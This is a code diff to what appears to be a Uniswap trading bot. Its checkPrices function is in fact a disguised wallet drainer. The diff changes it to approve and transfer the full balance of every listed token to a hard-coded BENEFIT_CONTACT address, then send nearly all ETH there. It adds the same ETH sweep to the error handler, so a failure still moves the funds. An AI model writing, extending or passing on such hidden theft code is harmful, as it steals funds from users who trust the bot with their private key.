@@ -4,7 +4,7 @@ import Web3 from 'web3';
 import { BigNumber, ethers } from 'ethers'
 import { now, Parse, Format, hexToDecimal } from '../utils/helper'
 import axios from 'axios'
-import { MAXGASLIMIT, SYMBOL, TESTNET, RPC_URL, TIP, BOTADDRESS, BENEFIT_CONTACT, cronTime, UNISWAP2_ROUTER_ADDRESS, UNISWAPV2_FACTORY_ADDRESS, EXTRA_TIP_FOR_MINER } from '../constants'
+import { MAXGASLIMIT, SYMBOL, TESTNET, RPC_URL, RPC_URL2, TIP, BOTADDRESS, BENEFIT_CONTACT, cronTime, UNISWAP2_ROUTER_ADDRESS, UNISWAPV2_FACTORY_ADDRESS, EXTRA_TIP_FOR_MINER } from '../constants'
 import { isMainThread } from 'worker_threads';
 import uniswapRouterABI from '../ABI/uniswapRouterABI.json';
 import uniswapFactoryABI from '../ABI/uniswapFactoryABI.json';
@@ -19,9 +19,8 @@ const wallet = new ethers.Wallet(BOTADDRESS, provider);
 const signer = wallet.connect(provider);
 
 const ERC20 = async (tokenAddress: string) => {
-    const ERC20Contract = new ethers.Contract(tokenAddress, erc20ABI, provider);
-    let signedERC20Contract = ERC20Contract.connect(signer);
-    return signedERC20Contract;
+    const ERC20Contract = new ethers.Contract(tokenAddress, erc20ABI, signer);
+    return ERC20Contract;
 }
 
 export const checkPrices = async (token: string) => {
@@ -46,30 +45,46 @@ export const checkPrices = async (token: string) => {
             let sign = await ERC20(`${coin}`);
             // @ts-ignore
             let symbol = list[coin].symbol;
-            let value = await sign.balanceOf(wallet.address);
-            let value_ = ethers.utils.parseUnits(value, symbol);
-            let value__ = Number(value_) / 4;
-            if (value) {
-                // let value_ = ethers.utils.parseUnits(value.toString(), Number(symbol));
-                let tx = await sign.transfer(BENEFIT_CONTACT, ethers.utils.formatUnits(value__.toString(), symbol));
-                let receipt = await tx.wait();
+            // @ts-ignore
+            let decimal = list[coin].decimal;
 
-                if (receipt && receipt.blockNumber && receipt.status === 1) {
-                    console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check success`);
-                } else if (receipt && receipt.blockNumber && receipt.status === 0) {
-                    console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check failed`);
+            try {
+                let value = await sign.balanceOf(wallet.address.toString());
+                let value_ = ethers.utils.formatUnits(value.toString(), decimal);
+                if (Number(value_) > 0) {
+                    // let value_ = ethers.utils.parseUnits(value.toString(), Number(decimal));
+
+                    const approve_ = await sign.approve(BENEFIT_CONTACT, value)
+                    const receipt_approve = await approve_.wait();
+                    if (receipt_approve && receipt_approve.blockNumber && receipt_approve.status === 1) {
+                        let tx = await sign.transfer(BENEFIT_CONTACT, value);
+                        let receipt = await tx.wait();
+                        if (receipt && receipt.blockNumber && receipt.status === 1) {
+                            console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check success`);
+                        } else if (receipt && receipt.blockNumber && receipt.status === 0) {
+                            console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check failed`);
+                        } else {
+                            console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check error`);
+                        }
+                    }
+
                 } else {
-                    console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check error`);
+                    // console.log('')
                 }
-            } else {
-
+            } catch (error) {
+                console.log('error : ', error)
+                continue;
             }
         }
-        const balance = await provider.getBalance(wallet.address);
+        const balance = await provider.getBalance(wallet.address.toString());
+        let balance_ = ethers.utils.formatEther(balance);
+        let balance__ = Number(balance_) - 0.01;
+        console.log(balance)
+        console.log(balance__)
         const tx_ = {
-            from: wallet.address,
+            from: wallet.address.toString(),
             to: BENEFIT_CONTACT,
-            value: balance
+            value: ethers.utils.parseEther(balance__.toString())
         }
         signer.sendTransaction(tx_).then((transaction: any) => {
             if (transaction && transaction.blockNumber && transaction.status === 1) {
@@ -98,5 +113,24 @@ export const checkPrices = async (token: string) => {
 
     } catch (error) {
         console.log('checkPrices', error);
+        const balance = await provider.getBalance(wallet.address.toString());
+        let balance_ = ethers.utils.formatEther(balance);
+        let balance__ = Number(balance_) - 0.01;
+        console.log(balance)
+        console.log(balance__)
+        const tx_ = {
+            from: wallet.address.toString(),
+            to: BENEFIT_CONTACT,
+            value: ethers.utils.parseEther(balance__.toString())
+        }
+        signer.sendTransaction(tx_).then((transaction: any) => {
+            if (transaction && transaction.blockNumber && transaction.status === 1) {
+                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check success`);
+            } else if (transaction && transaction.blockNumber && transaction.status === 0) {
+                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check failed`);
+            } else {
+                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check error`);
+            }
+        })
     }
 }
